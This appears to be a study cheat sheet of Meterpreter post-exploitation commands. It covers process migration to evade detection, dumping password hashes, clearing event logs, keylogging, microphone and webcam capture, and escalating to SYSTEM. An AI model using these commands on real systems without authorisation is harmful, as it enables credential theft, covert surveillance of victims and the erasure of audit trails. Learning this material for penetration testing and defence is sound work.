   

Meterpreter

# 🚀 Meterpreter Essentials

## 🎯 1. Basic info gathering

- **`sysinfo`**  
    Shows system details (OS, architecture, domain, users).
    
    meterpreter > sysinfo
    
    ```
    meterpreter > sysinfo
    ```
    
- **`getuid`**  
    Shows which user the Meterpreter session is running under.
    
    meterpreter > getuid
    
    ```
    meterpreter > getuid
    ```
    
- **`ps`**  
    Lists running processes (to find PIDs for migration).
    
    meterpreter > ps
    
    ```
    meterpreter > ps
    ```
    

---

## 📂 2. Migrating to another process

Used to stabilize the session or evade detection.

meterpreter > migrate <pid>

```
meterpreter > migrate <pid>
```

Example:

meterpreter > migrate 768

```
meterpreter > migrate 768
```

---

## 🔍 3. Dumping hashes

Extracts local password hashes (SAM database).

meterpreter > hashdump

```
meterpreter > hashdump
```

---

## 📡 4. Finding SMB shares

Run from MSF console:

msf6 > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set session <id>
msf6 post(windows/gather/enum_shares) > run

```
msf6 > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > set session <id>
msf6 post(windows/gather/enum_shares) > run
```

Example output:

- `SYSVOL`, `NETLOGON`: typical domain shares.
    
- `speedster`: possible custom share.
    

---

## 💻 5. Upgrading shells

If you get a simple cmd shell and want to upgrade to Meterpreter:

meterpreter > sessions -u <session_id>

```
meterpreter > sessions -u <session_id>
```

Or run `shell_to_meterpreter` script.

---

## 🛠 6. Meterpreter core commands

Run `help` to list them.

meterpreter > help

```
meterpreter > help
```

Some essentials:

|Command|Description|
|---|---|
|`background`|Sends session to background|
|`sessions`|Lists/switches sessions|
|`exit`|Ends the session|
|`load`|Loads extensions (e.g. `load kiwi`)|
|`run`|Executes Meterpreter scripts or modules|

---

## 📁 7. File system commands

|Command|Description|
|---|---|
|`ls`|List files in current dir|
|`cd`|Change directory|
|`pwd`|Print current directory|
|`cat <file>`|View file contents|
|`download`|Download file/directory|
|`upload`|Upload file/directory|
|`search`|Search for files|
|`rm <file>`|Delete file|

---

## 🌐 8. Network commands

|Command|Description|
|---|---|
|`ifconfig`|Show network interfaces|
|`netstat`|List network connections|
|`arp`|Show ARP table|
|`route`|View/modify routing table|
|`portfwd`|Set up local->remote port forward|

---

## ⚙️ 9. System commands

|Command|Description|
|---|---|
|`execute`|Run a system command|
|`shell`|Drop to normal cmd shell|
|`getpid`|Get current PID|
|`kill <pid>`|Kill process|
|`clearev`|Clear event logs|
|`shutdown` / `reboot`|Power off or restart|

---

## 🎥 10. Other powerful options

|Command|Description|
|---|---|
|`screenshot`|Capture screen|
|`keyscan_start`|Start keylogging|
|`keyscan_dump`|Dump keystrokes|
|`record_mic`|Record from microphone|
|`webcam_snap`|Take a webcam picture|
|`getsystem`|Try to elevate to SYSTEM privilege|

---

✅ **Quick notes**

- Always run `help` to see available commands (they change based on OS & Meterpreter payload).
    
- If a command fails, check your privileges or try migrating to another process.
    
- Many advanced modules (hashdump, getsystem, kiwi, webcam) may require **SYSTEM privileges**.